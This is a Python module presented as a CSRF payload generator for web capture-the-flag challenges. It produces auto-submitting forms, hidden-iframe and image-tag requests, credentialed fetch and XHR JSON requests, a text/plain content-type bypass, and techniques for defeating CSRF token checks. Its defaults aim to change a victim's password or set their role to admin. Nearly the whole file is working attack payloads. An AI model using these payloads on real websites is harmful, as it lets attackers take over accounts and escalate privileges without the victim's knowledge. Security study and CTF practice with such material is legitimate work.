"""
CSRF (Cross-Site Request Forgery) Payload Crafter for Web CTF.
Covers HTML form auto-submit, fetch-based CSRF, JSON CSRF, and token bypass techniques.
"""

from typing import List, Dict


def get_csrf_html_payloads(action_url: str = "https://target.com/change-password",
                           param1: str = "password", value1: str = "hacked") -> List[Dict[str, str]]:
    """Generate HTML-based CSRF payloads (auto-submitting forms)."""
    return [
        {
            "name": "Auto-Submit Form (GET)",
            "payload": f"""<html>
<body>
<form action="{action_url}" method="GET">
  <input type="hidden" name="{param1}" value="{value1}">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>""",
            "desc": "Auto-submitting GET form for state-changing requests."
        },
        {
            "name": "Auto-Submit Form (POST)",
            "payload": f"""<html>
<body>
<form action="{action_url}" method="POST">
  <input type="hidden" name="{param1}" value="{value1}">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>""",
            "desc": "Auto-submitting POST form for state-changing requests."
        },
        {
            "name": "Image Tag GET CSRF",
            "payload": f'<img src="{action_url}?{param1}={value1}" onerror="this.src=\'{action_url}?{param1}={value1}\'">',
            "desc": "Image tag triggers GET request without user interaction."
        },
        {
            "name": "Iframe Auto-Submit",
            "payload": f"""<iframe style="display:none" name="csrf-frame"></iframe>
<form action="{action_url}" method="POST" target="csrf-frame">
  <input type="hidden" name="{param1}" value="{value1}">
</form>
<script>document.forms[0].submit();</script>""",
            "desc": "Hidden iframe target to avoid navigation."
        },
        {
            "name": "Form with Multiple Parameters",
            "payload": f"""<form action="{action_url}" method="POST">
  <input type="hidden" name="{param1}" value="{value1}">
  <input type="hidden" name="confirm" value="{value1}">
</form>
<script>document.forms[0].submit();</script>""",
            "desc": "Handles forms requiring confirmation fields."
        }
    ]


def get_csrf_fetch_payloads(action_url: str = "https://target.com/api/change",
                            param1: str = "role", value1: str = "admin") -> List[Dict[str, str]]:
    """Generate fetch/XHR-based CSRF payloads for JSON APIs."""
    return [
        {
            "name": "Fetch POST JSON CSRF",
            "payload": f"""<script>
fetch('{action_url}', {{
  method: 'POST',
  headers: {{ 'Content-Type': 'application/json' }},
  body: JSON.stringify({{ '{param1}': '{value1}' }})
}});
</script>""",
            "desc": "Fetch-based JSON CSRF (works if server accepts simple requests)."
        },
        {
            "name": "XHR POST JSON CSRF",
            "payload": f"""<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '{action_url}', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({{ '{param1}': '{value1}' }}));
</script>""",
            "desc": "XMLHttpRequest-based JSON CSRF."
        },
        {
            "name": "Form-Encoded JSON Bypass",
            "payload": f"""<form action="{action_url}" method="POST" enctype="text/plain">
  <input type="hidden" name='{{"{param1}": "{value1}"}}' value="">
</form>
<script>document.forms[0].submit();</script>""",
            "desc": "Uses text/plain enctype to send JSON body (bypasses JSON content-type check)."
        },
        {
            "name": "Fetch with Credentials",
            "payload": f"""<script>
fetch('{action_url}', {{
  method: 'POST',
  credentials: 'include',
  headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
  body: '{param1}={value1}'
}});
</script>""",
            "desc": "Fetch with credentials included for cookie-based auth."
        }
    ]


def get_csrf_token_bypasses() -> List[Dict[str, str]]:
    """Techniques to bypass CSRF token validation."""
    return [
        {
            "name": "Remove Token Parameter",
            "payload": "Omit the CSRF token entirely",
            "desc": "Some servers only validate token if present."
        },
        {
            "name": "Empty Token Value",
            "payload": "csrf_token=",
            "desc": "Send empty token value."
        },
        {
            "name": "Use Session Token as CSRF Token",
            "payload": "csrf_token=<session_cookie_value>",
            "desc": "Some apps reuse the session cookie as CSRF token."
        },
        {
            "name": "Token in Cookie Only",
            "payload": "Send token via Cookie header, not body",
            "desc": "If server reads token from cookie, no body token needed."
        },
        {
            "name": "Duplicate Token Parameter",
            "payload": "csrf_token=valid&csrf_token=invalid",
            "desc": "HPP: server may use first (valid) while WAF checks second."
        },
        {
            "name": "Token in Query String",
            "payload": "Move token from body to URL query",
            "desc": "Some servers accept token in query string."
        },
        {
            "name": "Same-Site Cookie Bypass (Subdomain)",
            "payload": "Host CSRF from a subdomain",
            "desc": "SameSite=Lax allows top-level GET navigation from subdomains."
        }
    ]
